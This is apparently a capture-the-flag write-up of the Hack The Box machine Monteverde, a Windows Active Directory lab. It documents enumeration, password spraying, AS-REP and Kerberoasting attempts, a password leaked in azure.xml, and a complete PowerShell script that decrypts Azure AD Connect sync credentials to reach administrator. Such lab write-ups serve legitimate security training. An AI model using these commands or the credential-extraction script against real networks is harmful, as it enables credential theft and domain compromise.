---
title: HTB-Monteverde
draft: false
tags:
  - windows
  - active-directory
  - htb
  - azure
  - medium
---
## Recon
### Rustscan
Based on the ports open, I assumed that this machine running on **Active Directory**.

```bash
┌──(yoon㉿kali)-[~/Documents/htb]
└─$ rustscan --addresses 10.10.10.172 --range 1-65535
.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
--------------------------------------

Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/yoon/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.10.172:53
Open 10.10.10.172:88
Open 10.10.10.172:135
Open 10.10.10.172:139
Open 10.10.10.172:389
Open 10.10.10.172:445
Open 10.10.10.172:464
Open 10.10.10.172:593
Open 10.10.10.172:636
Open 10.10.10.172:3268
Open 10.10.10.172:3269
Open 10.10.10.172:5985
Open 10.10.10.172:9389
Open 10.10.10.172:49667
Open 10.10.10.172:49673
Open 10.10.10.172:49675
Open 10.10.10.172:49674
Open 10.10.10.172:49717
Open 10.10.10.172:52248
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 07:45 EDT

Initiating Ping Scan at 07:45
Scanning 10.10.10.172 [2 ports]
Completed Ping Scan at 07:45, 3.00s elapsed (1 total hosts)
Nmap scan report for 10.10.10.172 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.03 seconds
```
### SMB
I first tried anonymous SMB login through smbclient, which failed.

![](https://i.imgur.com/TAu7J23.png)

When smbclient fails, I usually move on to **crackmapexec** because it can provide me domain name even if the anonymous login is not allowed -> domain name: **MEGABANK.LOCAL** (added to /etc/hosts)

![](https://i.imgur.com/tzO6MRL.png)

### DNS
Using **dig**, I confirmed **megabank.local** exists->**ANSWER:1** means positive:

![](https://i.imgur.com/aqhxiWC.png)

I attempted on zone transfer but it failed:

![](https://i.imgur.com/VgSXSVr.png)
### RPC

I was able to login to RPC with null user name:

![](https://i.imgur.com/vsGgS47.png)

Here, I can obtain account names and query groups as well.

![](https://i.imgur.com/7NmMLD8.png)

Other than account name information nothing useful was found.
### LDAP
I first queried **base namingcontexts** and as expected I see **DC=MEGABANK,DC=LOCAL**:

![](https://i.imgur.com/xvcwVBW.png)

Luckily, I was able to null sessions bind with no credentials and I forwarded the output to txt file to be analyzed later.

![](https://i.imgur.com/QFbQcxd.png)

Output provided was too big so I sorted out with this command:

`cat megabank-local-x-bind.txt | awk '{print $1}' | sort | uniq -c | sort -nr > ldap-x-b-result-sorted.txt`
![](https://i.imgur.com/yZHnFzU.png)

Nothing very useful was found, but I still have list of **sAMAccountNames**.

`cat megabank-local-x-bind.txt | grep sAMAccountName | awk -F ': ' '{print $2}' > sAMAccountName.txt`
![](https://i.imgur.com/p63FszQ.png)

Now with this account names, I can attempt on **AS-REP Roasting**
## Exploitation
### AS-REP Roasting(Failed)
With the list of account names obtained from **RPC** and **LDAP**, I attempted on AS-REP Roasting attack -> **FAILED

`sudo GetNPUsers.py 'megabank.local/' -user sAMAccountName.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.172`
![](https://i.imgur.com/t5AAjQe.png)
### Password Spraying(Success!)
I first ran brute force using same list for both usernames and password list and surprisingly it worked -> **SABatchJobs:SABatchJobs**

`crackmapexec smb 10.10.10.172 -u sAMAccountName.txt -p sAMAccountName.txt --no-brute --continue-on-success`
![](https://i.imgur.com/3ctods6.png)

I can verify it is valid as such:

![](https://i.imgur.com/mbVmmaX.png)

Sadly, this account got no access to winrm:

![](https://i.imgur.com/JLNZOP9.png)
## Back to Enum
### SMB as SABatchJobs
Knowing that user **SABatchJobs** got access to SMB, I ran SMBMap to see what access the user has:

`smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs`
![](https://i.imgur.com/xC7zNhk.png)

I took time to recursively download all the shares with access and enumerated files inside of it.

![](https://i.imgur.com/ohekjmx.png)

**azure_uploads** -> Looked very interesting but empty
**NETLOGON** -> Empty
**SYSVOL** -> Nothing
**user$** -> azure.xml -> revealed another password!
  
Recursively listing contents inside download share, I discovered azure.xml which looked very interesting
  
`find . -ls`
![](https://i.imgur.com/nbe9sZE.png)

This seemed to be some kind of configuration file from Active Directory Powershell and it was leaking possible password: **4n0therD4y@n0th3r$**

![](https://i.imgur.com/7p4pncz.png)

I was pretty sure this password would pair with user **mhope** since it was found in his/hers directory but I still tried on password spraying.
### Password Spraying
Using crackmapexec for password spraying, I discovered account **mhope** pairs with the found password as expected:

`crackmapexec smb 10.10.10.172 -u sAMAccountName.txt -p '4n0therD4y@n0th3r$' --no-brute --continue-on-success`
![](https://i.imgur.com/Ova8bPh.png)

Luckily, this user had access to winrm:

![](https://i.imgur.com/66MQPfI.png)
## Privesc mhope to administrator
### SMB as mhope
I checked if account mhope has more access to different shares but it seemed it has the same access as account SABatchJobs -> **FAILED**

`smbmap -H 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`
![](https://i.imgur.com/UXNFWcm.png)
### Kerberoasting
Now that I have valid credentials, I tried on Kerberoasting -> **FAILED**

`sudo GetUserSPNs.py megabank.local/mhope:'4n0therD4y@n0th3r$' -dc-ip 10.10.10.172 -request -save -outputfile getuserspns-mhope.out`
![](https://i.imgur.com/pRknRQe.png)
### Bloodhound
I ran bloodhound-python to collect data from the domain:

`sudo python bloodhound.py -u mhope -p '4n0therD4y@n0th3r$' -c ALL -ns 10.10.10.172 -d megabank.local`
![](https://i.imgur.com/CDrlrYS.png)

Started bloodhound and neo4j:

```bash

sudo neo4j console

bloodhound

```

I first marked account **SABatchJobs** and **mhope** marked.

Both accounts had nothing on **outbound object control**.

Checking on route from account **mhope** to **administrator**, I see a valid path.

![](https://i.imgur.com/PfY5KMH.png)

I tried on following Bloodhound's recommendation to exploit this but it didn't work out -> **FAILED**
### Evil-Winrm
Now that I have tried everything without shell connection, I moved on to enumerating the system through **evil-winrm**:

`evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`
### Azure AD Sync Exploit
Checking on account mhope on system, I saw it is a member of **Azure Admin**, which is not very common:

`net user mhope`
![](https://i.imgur.com/RDqD1xZ.png)

On **C:\Program Files**, I can see there are directories related to **Azure AD**:

![](https://i.imgur.com/VH8n98U.png)

From some research, I discovered [this blog](https://blog.xpnsec.com/azuread-connect-for-redteam/?ref=t3chnocat.com), which talked in depth about **AD Connect Azure Sync Credential Extraction**.

The idea is that there is a user that is setup to handle replication of Active Directory to Azure. It turns out mhope is able to connect to the local database and pull the configuration. I can then decrypt it and get the username and password for the account that handles replication.

I slightly modified the script found from the blog above:

1. Remove the '@_xpn_' from this line: Write-Host “AD Connect Sync Credential Extract POC (@xpn)\n”
2.  The connection string should be $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"

Below is the modified script:

```powershell
Write-Host "AD Connect Sync Credential Extract POC ()`n"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

Uploading and running this script, I get access to administrator password which I can use gain access to administrator shell:

![](https://i.imgur.com/BZbCh9a.png)
## References
- https://blog.xpnsec.com/azuread-connect-for-redteam/?ref=t3chnocat.com